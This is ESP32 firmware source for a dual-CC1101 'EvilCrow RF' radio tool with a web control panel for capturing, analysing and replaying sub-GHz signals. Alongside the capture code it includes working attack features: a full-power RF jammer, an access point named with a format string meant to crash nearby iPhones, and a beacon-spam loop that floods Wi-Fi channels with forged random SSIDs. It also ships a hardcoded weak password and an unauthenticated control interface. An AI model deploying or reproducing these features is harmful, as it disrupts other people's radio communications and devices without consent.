
#define USE_LittleFS
#define FORMAT_LITTLEFS_IF_FAILED true

#include "ELECHOUSE_CC1101_SRC_DRV.h"
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h> 
#include "esp_wifi.h"     // Usage: Beacon-Spam
#include "RCSwitch.h"
//#include <FS.h>
#include <NimBLEDevice.h>
#include <LITTLEFS.h> 
#include "Web_Main.h"
#include "rxconfig.h"
#include "txconfig.h"
#include "FRQScan.h"
#include "CSSStyle.h"

#define samplesize 1000
#define RECEIVE_ATTR IRAM_ATTR

/* 0 = regular mode  (WIFI-AP)
 * 1 = client mode   (WIFI-CLI)
 * 2 = Iphone-Crash
 * 3 = BeaconSpam
 */
int BootMode = 0;
bool SpamBeacon = true;

// ---------------------------------------------------------------------
// Config SSID and password
// ---------------------------------------------------------------------
const char* ssid        = "EvilCrow RF";              // SSID of the Accesspoint
const char* password    = "123456789";                //  "123456789"; //Enter your Password here or use NULL for no PWD
const char* CLIssid     = "APName";                   // CLI-SSID
const char* CLIpassword = "APPass";                   // CLI-PWD

// ---------------------------------------------------------------------
// Config CC1101 Pins
// ---------------------------------------------------------------------
int sck = 18;     int miso = 19;    int mosi = 23;
int csn1 = 5;     int csn2 = 27;
int gdo0_1 = 2;   int gdo0_2 = 25;
int gdo2_1 = 4;   int gdo2_2 = 26;

// ---------------------------------------------------------------------
// Config Pushbutton Pins
// ---------------------------------------------------------------------
int push1 = 34;int pushbutton1 = 0;
int push2 = 35;int pushbutton2 = 0;
int push3 = 32;int pushbutton3 = 0;

// ---------------------------------------------------------------------
// LittleFS Log config
// ---------------------------------------------------------------------
const bool formatOnFail = true;

// ---------------------------------------------------------------------
// RCSwitch
// ---------------------------------------------------------------------
RCSwitch mySwitch = RCSwitch();
RCSwitch CC1101_1 = RCSwitch();
RCSwitch CC1101_2 = RCSwitch();       
         
// ----------------------------------------------------------------------------------------------------------------------------------------------
// Web-Controlled parameters (String) and Values(Int,Float)
// ----------------------------------------------------------------------------------------------------------------------------------------------
// Public Settings ------------------------------------------------------------------------------------------------------------------------------
String format     = "HEX";                      // Format for VAL
String value      = "FFFFFFFFFFFFFF";           // VALUE - holds sending value in Hex
int    module     = 1;                          // RAD - Radio Module to used for parameter set (Default 1)
// Settings for Module #1 -----------------------------------------------------------------------------------------------------------------------
int   RadioAState = 0;                          // 0 = not in use, 1 = receiving, 2 = sending, 3 = scanning, 4 = Jamming
float deviation1  = 47.6;                       // DEV - Set the Frequency deviation in kHz. Value from 1.58 to 380.85. Default is 47.60 kHz.
float frequency1  = 433.28;                     // FRQ - Frequency
float bandwidth1  = 58.00;                      // BAW - Bandwidth
int   modulation1 = 2;                          // MOD - 0 = 2-FSK, 1 = GFSK, 2 = ASK/OOK, 3 = 4-FSK, 4 = MSK
int   datarate1   = 99.97;                      // BPS - Set the Data Rate in kBaud. Value from 0.02 to 1621.83. Default is 99.97 kBaud!
// Settings for Module #2 -----------------------------------------------------------------------------------------------------------------------
int   RadioBState = 0;                          // 0 = not in use, 1 = receiving, 2 = sending, 3 = scanning, 4 = Jamming
float deviation2  = 47.6;                       // DEV - Set the Frequency deviation in kHz. Value from 1.58 to 380.85. Default is 47.60 kHz.
float frequency2  = 433.28;                     // FRQ - Frequency
float bandwidth2  = 58.00;                      // BAW - Bandwidth
int   modulation2 = 2;                          // MOD - 0 = 2-FSK, 1 = GFSK, 2 = ASK/OOK, 3 = 4-FSK, 4 = MSK
int   datarate2   = 99.97;                      // BPS - Set the Data Rate in kBaud. Value from 0.02 to 1621.83. Default is 99.97 kBaud!

int samplepulse;  
int samplecount;

int error_toleranz = 200;
int RXPin = 26;
int Gdo0 = 25;
const int minsample = 30;
unsigned long sample[samplesize];
unsigned long samplesmooth[samplesize];
long transmit_push[1000];


static unsigned long lastTime = 0;
String transmit = "";
long data_to_send[1000];
String raw_rx = "0";
String webString;
String bindata;
BLEScan* pBLEScan;

AsyncWebServer controlserver(80);
AsyncEventSource events("/events");

void LogEvent (String Content){
  Serial.println (Content);
  events.send(Content.c_str(),"message");
}

void ModuleChange (){
  // -------------------------------------
  // Force all Settings published in WEBUI
  // Via (FAKED) Serial Commands as EVENTS
  // -------------------------------------
  if (module == 1){
  LogEvent("SER.SET.FRQ.#1:" + String(frequency1));
  LogEvent("SER.SET.DEV.#1:" + String(deviation1));
  LogEvent("SER.SET.MOD.#1:" + String(modulation1));
  LogEvent("SER.SET.BAW.#1:" + String(bandwidth1));
  LogEvent("SER.SET.BPS.#1:" + String(datarate1));
  }else{
  LogEvent("SER.SET.FRQ.#2:" + String(frequency2));
  LogEvent("SER.SET.DEV.#2:" + String(deviation2));
  LogEvent("SER.SET.MOD.#2:" + String(modulation2));
  LogEvent("SER.SET.BAW.#2:" + String(bandwidth2));
  LogEvent("SER.SET.BPS.#2:" + String(datarate2));
  }
}

void OK200 (AsyncWebServerRequest *request){
      AsyncWebServerResponse *response = request->beginResponse(200, "text/html", ""); request->send(response); 
}
void NormalSend (String Content, AsyncWebServerRequest *request){
      AsyncWebServerResponse *response = request->beginResponse(200, "text/html", Content); request->send(response); 
      // LogEvent("HTTP_GET: " + String(request->url().c_str())); 
}
void CachedSend (String Content, AsyncWebServerRequest *request){
      AsyncWebServerResponse *response = request->beginResponse(200, "text/html", Content);
      response->addHeader("Cache-Control","public, max-age=3000"); request->send(response); 
      // LogEvent("HTTP_GET_AND_CACHE: " + String(request->url().c_str()));
}
void onEvent(AsyncWebSocket * server, AsyncWebSocketClient * client, AwsEventType type, void * arg, uint8_t *data, size_t len){
  if(type == WS_EVT_CONNECT){
    printf("ws[%s][%u] connect\n", server->url(), client->id());
    client->printf("Webevent-Connection established %u :)", client->id());
    client->ping();
  }
}

void SetForModule (int Smodule, String SParameter, String SValue, String SSource){
  if (SParameter == "RAD"){module      = SValue.toInt()            ;ELECHOUSE_cc1101.setModul         (module);LogEvent(SSource + "." + "SET.RAD:" + SValue);     ModuleChange();};
  if (SParameter == "VAL"){value       = SValue                                                               ;LogEvent(SSource + "." + "SET.VAL:" + SValue);};
  if (SParameter == "FMT"){format      = SValue                                                               ;LogEvent(SSource + "." + "SET.FMT:" + SValue);};
  if (module == 1){
    if (SParameter == "FRQ"){frequency1  = SValue.toFloat()      ;ELECHOUSE_cc1101.setMHZ         (frequency1);LogEvent(SSource + "." + "SET.FRQ.#1:" + SValue);};
    if (SParameter == "DEV"){deviation1  = SValue.toFloat()      ;ELECHOUSE_cc1101.setDeviation   (deviation1);LogEvent(SSource + "." + "SET.DEV.#1:" + SValue);};
    if (SParameter == "BPS"){datarate1   = SValue.toInt   ()     ;ELECHOUSE_cc1101.setDRate        (datarate1);LogEvent(SSource + "." + "SET.BPS.#1:" + SValue);};
    if (SParameter == "BAW"){bandwidth1  = SValue.toFloat  ()    ;ELECHOUSE_cc1101.setRxBW        (bandwidth1);LogEvent(SSource + "." + "SET.BAW.#1:" + SValue);};
    if (SParameter == "MOD"){modulation1 = SValue.toInt()        ;ELECHOUSE_cc1101.setModulation (modulation1);LogEvent(SSource + "." + "SET.MOD.#1:" + SValue);};
  };
  if (module == 2){
    if (SParameter == "FRQ"){frequency2  = SValue.toFloat()      ;ELECHOUSE_cc1101.setMHZ         (frequency2);LogEvent(SSource + "." + "SET.FRQ.#2:" + SValue);};
    if (SParameter == "DEV"){deviation2  = SValue.toFloat()      ;ELECHOUSE_cc1101.setDeviation   (deviation2);LogEvent(SSource + "." + "SET.DEV.#2:" + SValue);};
    if (SParameter == "BPS"){datarate2   = SValue.toInt   ()     ;ELECHOUSE_cc1101.setDRate        (datarate2);LogEvent(SSource + "." + "SET.BPS.#2:" + SValue);};
    if (SParameter == "BAW"){bandwidth2  = SValue.toFloat  ()    ;ELECHOUSE_cc1101.setRxBW        (bandwidth2);LogEvent(SSource + "." + "SET.BAW.#2:" + SValue);};
    if (SParameter == "MOD"){modulation2 = SValue.toInt()        ;ELECHOUSE_cc1101.setModulation (modulation2);LogEvent(SSource + "." + "SET.MOD.#2:" + SValue);};
  };
}


void FetchSend (String Content, AsyncWebServerRequest *request){
  NormalSend ("Settings Received", request);
}
void SetBootMode (int Mode){
  File BootMode = LITTLEFS.open("/BootMode.txt", FILE_WRITE);
  BootMode.print(Mode); BootMode.close();
  Serial.println ("Set Bootmode: " + String(Mode));
}
int GetBootMode (){
  File BootMode = LITTLEFS.open("/BootMode.txt", FILE_READ);
  int Result = String((char) BootMode.read()).toInt();
  Serial.println ("Get Bootmode: " + String(Result));
  return Result;
}
void SetupWifiAP (){
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
}
void SetupBadAP (){
  const char* ssidBad = "%p%s%s%s%s%n";
  WiFi.mode(WIFI_AP); WiFi.softAP(ssidBad, NULL);
}
void SetupWifiCLI (){
  WiFi.mode(WIFI_STA); 
  WiFi.begin(CLIssid, CLIpassword);
  int i = 0;
  while (WiFi.status() != WL_CONNECTED && i < 30)
  {delay(1000);Serial.print(".");}
  Serial.println(ssid);
  Serial.println(WiFi.localIP());
}

void SetupRadio(){
  ELECHOUSE_cc1101.addSpiPin(sck, miso, mosi, csn1, 2); pinMode(gdo2_1,INPUT);pinMode(gdo0_1,OUTPUT);CC1101_1.enableTransmit(gdo0_1);
  ELECHOUSE_cc1101.addSpiPin(sck, miso, mosi, csn2, 1); pinMode(gdo2_2,INPUT);pinMode(gdo0_2,OUTPUT);CC1101_2.enableTransmit(gdo0_2);

  ELECHOUSE_cc1101.setModul(1);                    
  ELECHOUSE_cc1101.Init();
  if (!ELECHOUSE_cc1101.getCC1101()){Serial.println("Radio#1: Connection Error");}
  ELECHOUSE_cc1101.setMHZ(frequency1);          // Sync with standard WebInterface
  ELECHOUSE_cc1101.setRxBW(bandwidth1);         // Sync with standard WebInterface
  ELECHOUSE_cc1101.setDRate (datarate1);        // BPS: Default: XXX
  ELECHOUSE_cc1101.setDeviation (deviation1);   // Deviation: Default: XXX
  ELECHOUSE_cc1101.setModulation(modulation1);  // ASK Default
  ELECHOUSE_cc1101.setPA(12);                   // Always use full power
  ELECHOUSE_cc1101.setSyncMode(0);              // Combined sync-word qualifier mode. 0 = No preamble/sync. 1 = 16 sync word bits detected. 2 = 16/16 sync word bits detected. 3 = 30/32 sync word bits detected. 4 = No preamble/sync, carrier-sense above threshold. 5 = 15/16 + carrier-sense above threshold. 6 = 16/16 + carrier-sense above threshold. 7 = 30/32 + carrier-sense above threshold.
  ELECHOUSE_cc1101.setPktFormat(3);             // Format of RX and TX data. 0 = Normal mode, use FIFOs for RX and TX. 1 = Synchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins. 2 = Random TX mode; sends random data using PN9 generator. Used for test. Works as normal mode, setting 0 (00), in RX. 3 = Asynchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins.
  delay(500);
  
  ELECHOUSE_cc1101.setModul(2);                    
  ELECHOUSE_cc1101.Init();
  if (!ELECHOUSE_cc1101.getCC1101()){Serial.println("Radio#2: Connection Error");}
  ELECHOUSE_cc1101.setMHZ(frequency2);          // Sync with standard WebInterface
  ELECHOUSE_cc1101.setRxBW(bandwidth2);         // Sync with standard WebInterface
  ELECHOUSE_cc1101.setDRate (datarate2);        // BPS: Default: XXX
  ELECHOUSE_cc1101.setDeviation (deviation2);   // Deviation: Default: XXX
  ELECHOUSE_cc1101.setModulation(modulation2);  // ASK Default
  ELECHOUSE_cc1101.setPA(12);                   // Always use full power
  ELECHOUSE_cc1101.setSyncMode(0);              // Combined sync-word qualifier mode. 0 = No preamble/sync. 1 = 16 sync word bits detected. 2 = 16/16 sync word bits detected. 3 = 30/32 sync word bits detected. 4 = No preamble/sync, carrier-sense above threshold. 5 = 15/16 + carrier-sense above threshold. 6 = 16/16 + carrier-sense above threshold. 7 = 30/32 + carrier-sense above threshold.
  ELECHOUSE_cc1101.setPktFormat(3);             // Format of RX and TX data. 0 = Normal mode, use FIFOs for RX and TX. 1 = Synchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins. 2 = Random TX mode; sends random data using PN9 generator. Used for test. Works as normal mode, setting 0 (00), in RX. 3 = Asynchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins.
  delay(500);
}

void SetupWebserver(){
  // ---------------------------------------------------------------------
  // WebEvent-API (NO WEBSOCKET, Just Server -> Client Messaging!)
  // ---------------------------------------------------------------------
  events.onConnect([](AsyncEventSourceClient *client){
    if(client->lastId()){client->send("Client (re)connected",NULL,millis(),1000);}
    client->send("Client connected",NULL,millis(),1000);
  });
  
  // ---------------------------------------------------------------------
  // Send complete Pages (and stop any TX/RX on page-switch)
  // ---------------------------------------------------------------------
  controlserver.on("/",           [](AsyncWebServerRequest *request) {CachedSend (WebMain,  request);RadioAState = 0; ModuleChange ();});
  controlserver.on("/rxconfig",   [](AsyncWebServerRequest *request) {CachedSend (RXConfig, request);RadioAState = 0; ModuleChange ();});
  controlserver.on("/txconfig",   [](AsyncWebServerRequest *request) {CachedSend (TXConfig, request);RadioAState = 0; ModuleChange ();});
  controlserver.on("/style.css",  [](AsyncWebServerRequest *request) {CachedSend (CSSStyle, request);});
  controlserver.on("/favicon.ico",[](AsyncWebServerRequest *request) {OK200(request);});
  
  controlserver.on("/frqscan",    [](AsyncWebServerRequest *request) {
    CachedSend (FRQScan,  request);   RadioAState = 3;
    SetForModule(module,"DEV","1.58","WEB"); // Deviation
    SetForModule(module,"BAW","58",  "WEB"); // Bandwidth
  });
  controlserver.on("/jammer",    [](AsyncWebServerRequest *request) {
    SetForModule(module,"DEV","380",  "WEB");  // Deviation
    SetForModule(module,"BAW","812",  "WEB");  // Bandwidth
    OK200(request);  ELECHOUSE_cc1101.SetTx(); RadioAState = 4;
  });
  
  // -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  // Eventing-Calls (missing exact param causes ESP32 reboot!) :: void SetForModule (int Smodule, String SParameter, String SValue, String SSource)
  // -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  controlserver.on("/set.RAD", [](AsyncWebServerRequest *request) {SetForModule(module,"RAD",request->getParam("RAD")->value(),"WEB");OK200(request);}); // Radio
  controlserver.on("/set.FMT", [](AsyncWebServerRequest *request) {SetForModule(module,"FMT",request->getParam("FMT")->value(),"WEB");OK200(request);}); // Format
  controlserver.on("/set.FRQ", [](AsyncWebServerRequest *request) {SetForModule(module,"FRQ",request->getParam("FRQ")->value(),"WEB");OK200(request);}); // Frequency
  controlserver.on("/set.DEV", [](AsyncWebServerRequest *request) {SetForModule(module,"DEV",request->getParam("DEV")->value(),"WEB");OK200(request);}); // Deviation
  controlserver.on("/set.BPS", [](AsyncWebServerRequest *request) {SetForModule(module,"BPS",request->getParam("BPS")->value(),"WEB");OK200(request);}); // Baudrate
  controlserver.on("/set.BAW", [](AsyncWebServerRequest *request) {SetForModule(module,"BAW",request->getParam("BAW")->value(),"WEB");OK200(request);}); // Bandwidth
  controlserver.on("/set.MOD", [](AsyncWebServerRequest *request) {SetForModule(module,"MOD",request->getParam("MOD")->value(),"WEB");OK200(request);}); // Modulation
  controlserver.on("/set.VAL", [](AsyncWebServerRequest *request) {SetForModule(module,"VAL",request->getParam("VAL")->value(),"WEB");OK200(request);}); // Value-Data

  // 0 = not in use, 1 = receiving, 2 = sending -- Handled in Main-Loop via RadioStates
  controlserver.on("/RXRUN",  [](AsyncWebServerRequest *request) {FetchSend(String("WEB.RUN.RCV.#1") ,request);enableReceive();             RadioAState = 1;LogEvent("Started RX");});
  controlserver.on("/RXEND",  [](AsyncWebServerRequest *request) {FetchSend(String("WEB.STP.RCV.#1") ,request);ELECHOUSE_cc1101.setSidle(); RadioAState = 0;LogEvent("Stopped RX");});
  controlserver.on("/TXEND",  [](AsyncWebServerRequest *request) {FetchSend(String("WEB.STP.TXV.#2") ,request);ELECHOUSE_cc1101.setSidle(); RadioAState = 0;LogEvent("Stopped TX");});
  controlserver.on("/TXRUN",  [](AsyncWebServerRequest *request) {FetchSend(String("WEB.RUN.TXV.#2") ,request);ELECHOUSE_cc1101.SetTx();    RadioAState = 2;LogEvent("Started TX");});
  
  controlserver.on("/heap",   HTTP_GET, [](AsyncWebServerRequest *request){request->send(200, "text/plain", String(ESP.getFreeHeap()));});
  controlserver.on("/reboot", HTTP_GET, [](AsyncWebServerRequest *request){ESP.restart();});
  controlserver.on("/RUN.IPC",  [](AsyncWebServerRequest *request) {SetBootMode(2);ESP.restart();}); // Iphone-Crash
  controlserver.on("/RUN.WBF",  [](AsyncWebServerRequest *request) {SetBootMode(3);ESP.restart();}); // Beacon Frames
  controlserver.on("/ScanWifi", HTTP_GET, [](AsyncWebServerRequest *request){request->send(LITTLEFS, "/WifiAP.txt", String());});
  controlserver.on("/ScanBT",   HTTP_GET, [](AsyncWebServerRequest *request){request->send(200, "text/plan", "");listBluetooth();});
  controlserver.onNotFound(     [](AsyncWebServerRequest *request) {LogEvent(String("Not found: " + String(request->url().c_str())));});
  
  controlserver.addHandler (&events);
  controlserver.begin();
}

void HandleSerial (){                              
  if(Serial.available()>0){
    String inputString = Serial.readStringUntil('\n');
    String DAT = inputString.substring(0, inputString.length()-1); 
    int REG = inputString.indexOf(':'); DAT.toLowerCase(); bool DONE = false;
    if (REG == -1) {
      // ---------------------------------------------------------------------
      // use simple commands without parameters
      // ---------------------------------------------------------------------
      if (DAT == "run.txv"){settx();          RadioAState = 2;DONE = true;};    
      if (DAT == "run.rxv"){enableReceive();  RadioAState = 1;DONE = true;};  
      if (DAT == "stop.txv"){                 RadioAState = 0;DONE = true;};    
      if (DAT == "stop.rxv"){                 RadioAState = 0;DONE = true;};  
    } else {
      // ---------------------------------------------------------------------
      // Use explicit paramter values with PAR:VAL  :: void SetForModule (int Smodule, String SParameter, String SValue, String SSource)
      // ---------------------------------------------------------------------
      String DAT1 = DAT.substring(0, REG);
      String DAT2 = DAT.substring(REG + 1, DAT.length());
      if (DAT1 == "set.rad"){SetForModule(module,"RAD",DAT2,"SER");DONE = true;};
      if (DAT1 == "set.frq"){SetForModule(module,"FRQ",DAT2,"SER");DONE = true;};
      if (DAT1 == "set.dev"){SetForModule(module,"DEV",DAT2,"SER");DONE = true;};
      if (DAT1 == "set.bps"){SetForModule(module,"BPS",DAT2,"SER");DONE = true;};
      if (DAT1 == "set.baw"){SetForModule(module,"BAW",DAT2,"SER");DONE = true;};
      if (DAT1 == "set.mod"){SetForModule(module,"MOD",DAT2,"SER");DONE = true;};  
      if (DAT1 == "set.val"){SetForModule(module,"VAL",DAT2,"SER");DONE = true;};                                               
      if (DAT1 == "set.run"){SetBootMode(DAT2.toInt());ESP.restart();};
    };
    if (DONE == false) {Serial.println ("Use (SET/GET).(FRQ/DEV/MOD/BPS/BAW).(1/2):[Parameter value] to set Parameters for specific radio module");};
  }
}

void setup() {
  Serial.begin(38400);
  LITTLEFS.begin(FORMAT_LITTLEFS_IF_FAILED);

  // listNetworks(); // Creates a listing of all Wifi-Networks around ...
  
  BootMode = GetBootMode(); 
  if (BootMode == 0){SetupWifiAP();  SetupWebserver();SetupRadio();}
  if (BootMode == 1){SetupWifiCLI(); SetupWebserver();SetupRadio();}
  if (BootMode == 2){SetBootMode(0);SetupBadAP();SetupWebserver();SetupRadio();}
  if (BootMode == 3){SetBootMode(0);SetupBeaconSpam();}
}  

void loop() {
  HandleSerial();
  HandleSend ();
  if (RadioAState == 3) {frqScan();}
  if (RadioAState == 4) {setJammer();}
  if (BootMode == 3)    {LoopbroadcastRandomSSID();}

  // Redefine this Stuff
  if(RadioAState == 1) { // 0 = not in use, 1 = receiving, 2 = sending, 3 = scanning
    if(checkReceived()){
      printReceived();
      signalanalyse();
      enableReceive();
    }
  }
}

void HandleSend(){
  if (RadioAState == 2) {settx();};
}

int RssiData[128];             // Am besten global Speichern
float FreqResolution = 0.05;   // Hier die Auflösung eintragen 
 
String join(unsigned long vals[], String sep, int items) {
  String out = "";
  for (int i=0; i<items; i++) {
    out = out + String(vals[i] * -1);
    if ((i + 1) < items) {
      out = out + sep;
    }
  }
  return out;
}
String join(int vals[], String sep, int items) {
  String Scompress = "000111222333444555666777888999ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{{||}}~~[[\\]]^^__``::;;<<==>>??@@!!##$$%%&&(())**++,,--..//";
  char Ccompress [Scompress.length()+1]; Scompress.toCharArray(Ccompress, Scompress.length());
  String out = "";
  for (int i=0; i<items; i++) {
    out = out + Ccompress[vals[i]];
    //if ((i + 1) < items) {
    // out = out + sep;
    //}
  }
  return out;
}

void frqScan(){
  frequency1 = frequency1 - (64 * FreqResolution); // Center FRQ to 64 Steps left, right
  ELECHOUSE_cc1101.SetRx();
  for (int i = 0; i<128; i++){
    ELECHOUSE_cc1101.setMHZ(frequency1);
    delayMicroseconds(400);                         // Setup Time
    RssiData[i] = ELECHOUSE_cc1101.getRssi() * -1;
    // RssiData[i] = ELECHOUSE_cc1101.getLqi();
    frequency1+=FreqResolution;
  };
  frequency1 = frequency1 - (64 * FreqResolution);  // Reset to Original
  LogEvent("FRQSCAN:" + join(RssiData,";",128)); 
  delay (10);                                       // Limit Messages to avoid queuing
}

void settx(){
  if (module == 1) {CC1101_1.send (value.c_str());};
  if (module == 2) {CC1101_2.send (value.c_str());};
};
  
void setJammer (){
      if (module == 1) {CC1101_1.send ("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");};
      if (module == 2) {CC1101_2.send ("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");};
};























void RECEIVE_ATTR receiver() {
  const long          time    = micros();
  const unsigned int duration = time - lastTime;
  if (duration >  100000){samplecount = 0;}
  if (duration >= 100)   {sample[samplecount++] = duration;}
  if (samplecount>=samplesize){
    detachInterrupt(gdo2_1);
    detachInterrupt(gdo2_2);
    checkReceived();
  }
  lastTime = time;
}
void enableReceive(){
  samplecount = 0;
  gdo2_1 = digitalPinToInterrupt(gdo2_1); ELECHOUSE_cc1101.SetRx();attachInterrupt(gdo2_1, receiver, CHANGE);
  gdo2_2 = digitalPinToInterrupt(gdo2_2); ELECHOUSE_cc1101.SetRx();attachInterrupt(gdo2_2, receiver, CHANGE);
}
void printReceived(){
  LogEvent("Count#:" + String (samplecount) + ":" + join(sample,",",1000));
}
bool checkReceived(void){
  delay(1);
  if (samplecount >= minsample && micros()-lastTime >100000){
    detachInterrupt(gdo2_1);
    detachInterrupt(gdo2_2);
    return 1;
  }else{
    return 0;
  }
}
void signalanalyse(){
  #define signalstorage 10

  int signalanz=0;
  int timingdelay[signalstorage];
  float pulse[signalstorage];
  long signaltimings[signalstorage*2];
  int signaltimingscount[signalstorage];
  long signaltimingssum[signalstorage];
  long signalsum=0;

  for (int i = 0; i<signalstorage; i++){
    signaltimings[i*2] = 100000;
    signaltimings[i*2+1] = 0;
    signaltimingscount[i] = 0;
    signaltimingssum[i] = 0;
  }

  for (int i = 1; i<samplecount; i++){
    signalsum+=sample[i];
  }

  for (int p = 0; p<signalstorage; p++){

  for (int i = 1; i<samplecount; i++){
    if (p==0){
      if (sample[i]<signaltimings[p*2]){
        signaltimings[p*2]=sample[i];
      }
    }else{
      if (sample[i]<signaltimings[p*2] && sample[i]>signaltimings[p*2-1]){
        signaltimings[p*2]=sample[i];
      }
    }
  }

  for (int i = 1; i<samplecount; i++){
    if (sample[i]<signaltimings[p*2]+error_toleranz && sample[i]>signaltimings[p*2+1]){
      signaltimings[p*2+1]=sample[i];
    }
  }

  for (int i = 1; i<samplecount; i++){
    if (sample[i]>=signaltimings[p*2] && sample[i]<=signaltimings[p*2+1]){
      signaltimingscount[p]++;
      signaltimingssum[p]+=sample[i];
    }
  }
  }

  signalanz=signalstorage;
  for (int i = 0; i<signalstorage; i++){
    if (signaltimingscount[i] == 0){
      signalanz=i;
      i=signalstorage;
    }
  }

  for (int s=1; s<signalanz; s++){
  for (int i=0; i<signalanz-s; i++){
    if (signaltimingscount[i] < signaltimingscount[i+1]){
      int temp1 = signaltimings[i*2];
      int temp2 = signaltimings[i*2+1];
      int temp3 = signaltimingssum[i];
      int temp4 = signaltimingscount[i];

      signaltimings[i*2] = signaltimings[(i+1)*2];
      signaltimings[i*2+1] = signaltimings[(i+1)*2+1];
      signaltimingssum[i] = signaltimingssum[i+1];
      signaltimingscount[i] = signaltimingscount[i+1];

      signaltimings[(i+1)*2] = temp1;
      signaltimings[(i+1)*2+1] = temp2;
      signaltimingssum[i+1] = temp3;
      signaltimingscount[i+1] = temp4;
    }
  }
  }

  for (int i=0; i<signalanz; i++){
    timingdelay[i] = signaltimingssum[i]/signaltimingscount[i];
  }

  bool lastbin=0;
  for (int i=1; i<samplecount; i++){
    float r = (float)sample[i]/timingdelay[0];
    int calculate = r;
    r = r-calculate;
    r*=10;
    if (r>=5){calculate+=1;}
    if (calculate>0){
      if (lastbin==0){
        lastbin=1;
      }else{
      lastbin=0;
    }
      if (lastbin==0 && calculate>8){
        LogEvent(" [Pause: ");
        LogEvent(String(sample[i]));
        LogEvent(" samples]");
      }else{
        for (int b=0; b<calculate; b++){
          // LogEvent(String(lastbin));
        }
      }
    }
  }

  LogEvent("Samples/Symbol: " + String(timingdelay[0]));

  int smoothcount=0;
  for (int i=1; i<samplecount; i++){
    float r = (float)sample[i]/timingdelay[0];
    int calculate = r;
    r = r-calculate;
    r*=10;
    if (r>=5){calculate+=1;}
    if (calculate>0){
      samplesmooth[smoothcount] = calculate*timingdelay[0];
      smoothcount++;
    }
  }

  LogEvent("Count=" + String(smoothcount+1));
  LogEvent("Rawdata corrected:" + join(samplesmooth,",",smoothcount));
  for (int i=0; i<smoothcount; i++){
    transmit_push[i] = samplesmooth[i];
  }

  return;
}











class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice *advertisedDevice) {
      LogEvent (advertisedDevice->toString().c_str());
    }
};
void scanCompleteCB(BLEScanResults scanResults) {
  printf("Scan complete!\n");
}
void listBluetooth(){
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  pBLEScan->start(0, scanCompleteCB);
}

void listNetworks() {
  delay(100);
  String ssid;
  uint8_t encryptionType;
  int32_t RSSI;
  uint8_t* BSSID;
  int32_t channel;
  int netcount = WiFi.scanNetworks();
  
  File WifiAP = LITTLEFS.open("/WifiAP.txt", FILE_WRITE);
  if(!WifiAP){Serial.println("failed to open file for writing");return;}
  WifiAP.println("Note: This is a boot-time listing");
  WifiAP.println("--------------------------------");
  WifiAP.println("SSID | ENC.TYPE | RSSI | CHANNEL");
  WifiAP.println("--------------------------------");
  
  for (int n = 0; n < netcount; n++) {
    WiFi.getNetworkInfo(n, ssid, encryptionType, RSSI, BSSID, channel);
    WifiAP.print(ssid + " - ");
    WifiAP.print(String(encryptionType) + " | ");
    WifiAP.print(String(RSSI) + " | ");
    WifiAP.print(String(channel) + " | ");
    WifiAP.println("");
  }
  WifiAP.close();
}

// ---------------------------------------------------------------------
// Wifi-FakeAP 
// ---------------------------------------------------------------------
String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c,  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 
                0x00,   0x01, 0x04, 0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 
                0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,  0x04};   
//                
void SetupBeaconSpam(){
  Serial.println("Beacon Spam...");
  int packets_sent = 0;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); 
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
}

void LoopbroadcastRandomSSID() {
    int set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);
  packet[37] = 6;
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04};

  for(int i = 0; i < 12; i++){
    packet[38 + 6 + i] = postSSID[i];
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    delay(3); // avoid Memory overflow
  }
}
